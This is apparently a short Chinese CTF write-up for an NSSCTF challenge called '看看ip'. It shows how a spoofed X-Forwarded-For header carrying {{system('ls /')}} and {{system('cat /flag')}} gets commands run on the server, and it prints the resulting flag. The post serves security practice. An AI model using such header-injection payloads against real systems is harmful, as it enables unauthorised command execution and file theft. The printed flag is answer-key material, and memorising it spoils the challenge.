---
title: 看看ip
published: 2025-09-07
category: CTF
---

打开网站发现，点击 `Reveal My IP` 可以显示当前ip。打开bp进行抓包，发现只是调用了一个ip查询的api。

因为是"看看ip"加fetch联想到XFF头伪造命令执行，构造：

```
X-Forwarded-For: {{system('ls /')}}
```

发现网页返回结果中有flag字样，于是直接构造：

```
X-Forwarded-For: {{system('cat /flag')}}
```

**Flag**：`NSSCTF{220b62a8-5e58-4498-ba00-218dd328b303}`
